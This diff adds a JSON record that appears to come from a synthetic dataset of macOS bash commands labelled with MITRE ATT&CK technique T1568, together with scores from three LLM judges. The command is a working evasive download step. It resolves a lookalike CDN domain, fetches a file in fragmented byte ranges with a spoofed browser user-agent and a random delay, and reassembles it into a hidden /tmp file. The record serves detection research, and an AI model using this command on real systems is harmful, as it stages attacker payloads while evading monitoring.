@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1568",
+  "platform": "macOS",
+  "shell": "bash",
+  "command": "d=\"assets-cdn-cache.net\"; ip=$(dig +short \"$d\" | head -1); ua=\"Mozilla/5.0 (Macintosh; Intel Mac OS X) AppleWebKit/605.1.15\"; if [ -n \"$ip\" ]; then wget -q --header=\"Host: $d\" --user-agent=\"$ua\" --header=\"Range: bytes=0-511\" \"http://$ip/assets/img/sprite.png\" -O /tmp/.p1; sleep $((RANDOM%2+1)); wget -q --header=\"Host: $d\" --user-agent=\"$ua\" --header=\"Range: bytes=512-1023\" \"http://$ip/assets/img/sprite.png\" -O /tmp/.p2; cat /tmp/.p1 /tmp/.p2 > /tmp/.sprite && rm /tmp/.p1 /tmp/.p2; fi",
+  "explanation": "Resolves a CDN-like domain at runtime and downloads content in small HTTP ranges to fragment traffic, resembling partial asset fetches common in browsers.",
+  "rationale_steps": [
+    "Resolve target domain to current IP at runtime.",
+    "Use Range headers to fragment transfer into small chunks.",
+    "Introduce timing delay to reduce detectability and reassemble locally."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-6ea66e0e-1581247c",
+  "source_prompt_hash": "6ea66e0e",
+  "timestamp_utc": "2025-09-30T03:15:34.833319Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flags, and correct syntax for variable assignment, conditionals, and command execution.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements dynamic resolution by resolving a domain at runtime, then using the IP to establish communication through fragmented HTTP requests that mimic legitimate browser behavior, with randomized sleep to evade timing-based detection.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T05:17:17.546747Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct syntax for variable assignments, command substitutions, conditional statements, and utility flag usages.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns by resolving a network endpoint (IP address) at runtime using `dig`, which is crucial for adversaries employing dynamic C2 infrastructures like fast-flux or DGAs.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T05:17:37.274356Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed bash with balanced quoting, valid substitutions, proper separators, and correct wget/dig flags.",
+        "semantic_score": 3,
+        "semantic_justification": "It resolves a single domain at runtime and fetches via IP with Host and range headers as described, but lacks the algorithmic endpoint generation/rotation characteristic of T1568 dynamic resolution.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T05:17:44.677009Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
